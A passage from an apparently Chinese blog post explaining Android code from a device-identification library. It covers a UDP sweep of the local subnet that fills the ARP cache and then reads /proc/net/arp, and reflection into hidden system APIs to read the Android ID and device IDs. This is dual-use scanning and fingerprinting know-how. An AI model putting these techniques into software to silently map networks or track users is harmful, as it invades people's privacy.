class_">DatagramPacket</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            DatagramSocket socket;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">while</span> (position &lt; <span class="number">255</span>) &#123;</span><br><span class="line">                    Log.e(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;run: udp-&quot;</span> + substring + position);</span><br><span class="line">                    dp.setAddress(InetAddress.getByName(substring + String.valueOf(position)));</span><br><span class="line">                    socket.send(dp);</span><br><span class="line">                    position++;</span><br><span class="line">                    <span class="keyword">if</span> (position == <span class="number">125</span>) &#123;<span class="comment">//分两段掉包，一次性发的话，达到236左右，会耗时3秒左右再往下发</span></span><br><span class="line">                        socket.close();</span><br><span class="line">                        socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                socket.close();</span><br><span class="line">                execCatForArp(listener);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要的逻辑发生在下方的run中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DatagramPacket</span> <span class="variable">dp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    DatagramSocket socket;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SocketException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure><p><code>DatagramPacket dp = new DatagramPacket(new byte[0], 0, 0);</code></p><ul><li>创建一个UDP数据包（<code>DatagramPacket</code>）。这个数据包的内容是空的（<code>new byte[0]</code>），因为发送数据本身不重要。重要的是<strong>发送这个动作本身</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">while</span> (position &lt; <span class="number">255</span>) &#123;</span><br><span class="line">    Log.e(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;run: udp-&quot;</span> + substring + position);</span><br><span class="line">    dp.setAddress(InetAddress.getByName(substring + String.valueOf(position)));</span><br><span class="line">    socket.send(dp);</span><br><span class="line">    position++;</span><br><span class="line">    <span class="keyword">if</span> (position == <span class="number">125</span>) &#123;<span class="comment">//分两段掉包，一次性发的话，达到236左右，会耗时3秒左右再往下发</span></span><br><span class="line">        socket.close();</span><br><span class="line">        socket = <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">socket.close();</span><br><span class="line">execCatForArp(listener);</span><br></pre></td></tr></table></figure><p> <code>position</code>从2到254，避开网路地址(.0)、常见网关(.1)和广播地址(.255)</p><p><strong><code>dp.setAddress(InetAddress.getByName(substring + String.valueOf(position)));</code></strong></p><p>在循环中，为UDP包设置目标IP地址，例如 <code>&quot;192.168.1.2&quot;, &quot;192.168.1.3&quot;, ...</code></p><p><strong><code>socket.send(dp);</code></strong></p><ul><li><strong>核心操作</strong>。向目标IP发送这个空的UDP包。当操作系统执行这个发送命令时，它需要知道目标IP对应的MAC地址</li><li>如果操作系统的ARP缓存中没有这个IP的记录，它就会在局域网中广播一个<code>ARP</code>请求：“谁是 192.168.1.x？请告诉我你的MAC地址。”</li><li>如果网络中存在该IP的设备，它会响应这个ARP请求。</li><li><strong>无论目标设备是否真的在监听UDP端口，只要它响应了ARP请求，它的IP-MAC映射关系就会被记录到本机的ARP缓存中。</strong></li></ul><p>**<code>if (position == 125) &#123; ... &#125;</code>**经验优化，分两段发包，可以学习！</p><p>最后执行<code>execCatForArp</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行 cat命令 查找android 设备arp表</span></span><br><span class="line"><span class="comment"> * arp表 包含ip地址和对应的mac地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">execCatForArp</span><span class="params">(<span class="keyword">final</span> OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">final</span> Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                <span class="type">Process</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cat proc/net/arp&quot;</span>);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> exec.getInputStream();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Log.e(<span class="string">&quot;kalshen&quot;</span>, <span class="string">&quot;run: &quot;</span> + line);</span><br><span class="line">                    <span class="keyword">if</span> (!line.contains(<span class="string">&quot;00:00:00:00:00:00&quot;</span>) &amp;&amp; !line.contains(<span class="string">&quot;IP&quot;</span>)) &#123;</span><br><span class="line">                        String[] split = line.split(<span class="string">&quot;\\s+&quot;</span>);</span><br><span class="line">                        map.put(split[<span class="number">3</span>], split[<span class="number">0</span>]);</span><br><span class="line">                        <span class="comment">//                                Log.e(&quot;kalshen&quot;, &quot;run: &quot; + s1);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                mHandler.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        listener.scan(map);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在完善完ARP表之后<code>cat proc/net/arp</code></p><p>然后<code>map.put(split[3], split[0]);</code>将MAC地址和IP地址分别作为key和value存储在<code>map</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 execCatForArp 方法的后台线程中</span></span><br><span class="line">mHandler.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        listener.scan(map); <span class="comment">// 这行代码将在主线程上执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>mHandler是通过<code>private Handler mHandler = new Handler(Looper.getMainLooper());</code>来获取主线程的Looper，然后将这个 <code>Runnable</code> 对象发送到 <code>mHandler</code> 所绑定的消息队列中，也就是<strong>主线程的消息队列</strong></p><p>主线程有一个持续运行的 <code>Looper</code>，它会不断地从自己的消息队列中取出消息或 <code>Runnable</code> 来执行。当主线程的 <code>Looper</code> 处理到我们刚刚投递的这个 <code>Runnable</code> 对象时，它就会在<strong>主线程的环境下</strong>调用该对象的 <code>run()</code> 方法</p><p>而这个scan方法，是在这个接口定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OnScanListener</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">scan</span><span class="params">(Map&lt;String, String&gt; resultMap)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>getMac</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getMac</span><span class="params">(IpScanner.OnScanListener listener)</span> &#123;</span><br><span class="line">    <span class="type">IpScanner</span> <span class="variable">ipScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IpScanner</span>();</span><br><span class="line">    ipScanner.startScan(listener);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>listener</code>并没有被实现，因此这个<code>listener</code>的处理是通过用户外部传入的，处理的参数就是最后传出来的map结果</p><h3 id="ShellAdbUtils-java"><a href="#ShellAdbUtils-java" class="headerlink" title="ShellAdbUtils.java"></a>ShellAdbUtils.java</h3><p><code>ShellAdbUtils</code> 类被设计为不可实例化，它只包含静态方法和静态常量，这是一个典型的工具类设计模式</p><p>这个类是一个用于在 Android 设备上执行 Shell 命令的工具类</p><p>它封装了通过 <code>Runtime.getRuntime().exec()</code> 执行命令的逻辑，并提供了检查 root 权限、以 root 或普通用户身份执行单个或多个命令的功能</p><h3 id="androidid"><a href="#androidid" class="headerlink" title="androidid"></a>androidid</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid.androidid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.provider.Settings;</span><br><span class="line"><span class="keyword">import</span> android.text.TextUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * androidid获取</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IAndroidIdUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getAndroidId</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        String androidId;</span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(androidId = ISettingUtils.getAndroidPropertyLevel1(context, Settings.Secure.ANDROID_ID))</span><br><span class="line">                || !TextUtils.isEmpty(androidId = ISettingUtils.getAndroidProperty(context, Settings.Secure.ANDROID_ID))) &#123;</span><br><span class="line">            <span class="keyword">return</span> androidId;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    getStringForUser 是一个隐藏方法，按理说 第三方不能随意修改，因为版本不一致，但是仍然可以修改，虽然可能导致ROM不稳定，但是定制ROM或者做插件的也许不关心</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getAndroidPropertyLevel1</span><span class="params">(Context context, String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ContentResolver</span> <span class="variable">resolver</span> <span class="operator">=</span> context.getContentResolver();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">mUserHandle</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.UserHandle&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getUserId</span> <span class="operator">=</span> mUserHandle.getDeclaredMethod(<span class="string">&quot;getUserId&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        getUserId.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">uid</span> <span class="operator">=</span> (<span class="type">int</span>) getUserId.invoke(<span class="literal">null</span>, Process.myUid());</span><br><span class="line"></span><br><span class="line">        HashSet&lt;String&gt; MOVED_TO_SECURE = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        HashSet&lt;String&gt; MOVED_TO_LOCK_SETTINGS = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        HashSet&lt;String&gt; MOVED_TO_GLOBAL = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Global</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Global&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Global.getDeclaredField(<span class="string">&quot;MOVED_TO_SECURE&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            MOVED_TO_SECURE = (HashSet&lt;String&gt;) field.get(Global);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Secure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Secure&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Secure.getDeclaredField(<span class="string">&quot;MOVED_TO_LOCK_SETTINGS&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            MOVED_TO_LOCK_SETTINGS = (HashSet&lt;String&gt;) field.get(Secure);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Secure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Secure&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Secure.getDeclaredField(<span class="string">&quot;MOVED_TO_GLOBAL&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            MOVED_TO_GLOBAL = (HashSet&lt;String&gt;) field.get(Secure);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (MOVED_TO_SECURE.contains(name)) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MOVED_TO_GLOBAL.contains(name)) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">mSecure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Global&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getStringForUser</span> <span class="operator">=</span> mSecure.getDeclaredMethod(<span class="string">&quot;getStringForUser&quot;</span>, ContentResolver.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">            getStringForUser.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> (String) getStringForUser.invoke(<span class="literal">null</span>, resolver, name, uid);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((MOVED_TO_LOCK_SETTINGS.contains(name))) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>);</span><br><span class="line">            getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, <span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.widget.ILockSettings$Stub&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">            asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">sIsSystemProcess</span> <span class="operator">=</span> Process.myUid() == Process.SYSTEM_UID;</span><br><span class="line">            <span class="keyword">if</span> (MOVED_TO_LOCK_SETTINGS.contains(name)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (binderProxy != <span class="literal">null</span> &amp;&amp; !sIsSystemProcess) &#123;</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">proxy</span> <span class="operator">=</span> binderProxy.getClass();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">getString</span> <span class="operator">=</span> proxy.getDeclaredMethod(<span class="string">&quot;getString&quot;</span>, String.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">                    <span class="keyword">return</span> (String) getString.invoke(name, <span class="string">&quot;0&quot;</span>, uid);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Secure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Settings$Secure&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Secure.getDeclaredField(<span class="string">&quot;sNameValueCache&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">sNameValueCache</span> <span class="operator">=</span> field.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">NameValueCache</span> <span class="operator">=</span> sNameValueCache.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getStringForUser</span> <span class="operator">=</span> NameValueCache.getDeclaredMethod(<span class="string">&quot;getStringForUser&quot;</span>, ContentResolver.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">        <span class="keyword">return</span> (String) getStringForUser.invoke(sNameValueCache, resolver, name, uid);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br></pre></td></tr></table></figure><p>通过大量的反射，调用很多安卓内部的方法和字段名</p><ol><li><p><code>android.os.UserHandle</code>类中的<code>getUserId</code>静态方法获取uid</p></li><li><p><code>android.provider.Settings$Global</code>内部类中的<code>MOVED_TO_SECURE</code>字段</p><blockquote><p><code>MOVED_TO_SECURE</code> 是一个 <code>private static final HashSet&lt;String&gt;</code> 类型的字段。它的作用是记录那些<strong>从 <code>Settings.Global</code> 表迁移到 <code>Settings.Secure</code> 表的设置项的键名</strong></p><p>当系统尝试访问一个曾经在 <code>Global</code> 中但现在已迁移的设置时，会检查这个 <code>HashSet</code>。如果设置项的键名存在于 <code>MOVED_TO_SECURE</code> 中，系统就会重定向到 <code>Settings.Secure</code> 去读取，并打印一条警告日志</p><p>总结来说，<code>MOVED_TO_SECURE</code> 字段是 <code>Settings.Global</code> 类内部用于处理设置项迁移的一个私有静态成员</p></blockquote><p>如果当在<code>MOVED_TO_SECURE</code>这个字段中存在<code>Settings.Secure.ANDROID_ID</code>的话，那么就会调用<code>android.provider.Settings</code> 类中一个内部类 <code>NameValueCache</code> 的 <code>getStringForUser</code> 方法。这个方法是 Android 系统中从设置（Settings）数据库（如 <code>System</code>, <code>Secure</code>, <code>Global</code> 表）中读取一个特定键值（Setting）的核心逻辑</p><blockquote><p><strong>根据给定的设置名称（<code>name</code>）和用户句柄（<code>userHandle</code>），安全、高效地从内容提供者（Content Provider）中检索对应的字符串值</strong></p></blockquote></li><li><p><code>android.provider.Settings$Secure</code>内部类中的<code>MOVED_TO_LOCK_SETTINGS</code>字段</p><p>如果该字段存在对应的键名，会先调用<code>android.os.ServiceManager</code>类中的<code>getService</code>静态方法，这个函数是 Android 框架中用于获取系统服务（System Service）的 <code>IBinder</code> 接口的核心方法，<code>lock_settings</code> 是 <code>LockSettingsService</code> 服务的注册名称。这个服务运行在 <code>system_server</code> 进程中，专门负责管理与设备锁屏安全相关的设置</p><p>之后通过<code>asInterface</code>返回的<code>Proxy</code>远程调用<code>getString</code>来获取对应字段的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> LockSettingsStorage mStorage;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getString</span><span class="params">(String key, String defaultValue, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">       checkReadPermission(key, userId);</span><br><span class="line">       <span class="keyword">return</span> mStorage.getString(key, defaultValue, userId);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>android.provider.Settings$Secure</code>内部类中的<code>MOVED_TO_GLOBAL</code>字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">mSecure</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.provider.Global&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getStringForUser</span> <span class="operator">=</span> mSecure.getDeclaredMethod(<span class="string">&quot;getStringForUser&quot;</span>, ContentResolver.class, String.class, <span class="type">int</span>.class);</span><br><span class="line">getStringForUser.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">return</span> (String) getStringForUser.invoke(<span class="literal">null</span>, resolver, name, uid);</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getDeviceIdLevel2</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">deviceId</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ServiceManager</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getService</span> <span class="operator">=</span> ServiceManager.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class);</span><br><span class="line">        getService.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">binder</span> <span class="operator">=</span> (IBinder) getService.invoke(<span class="literal">null</span>, Context.TELEPHONY_SERVICE);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.ITelephony$Stub&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span 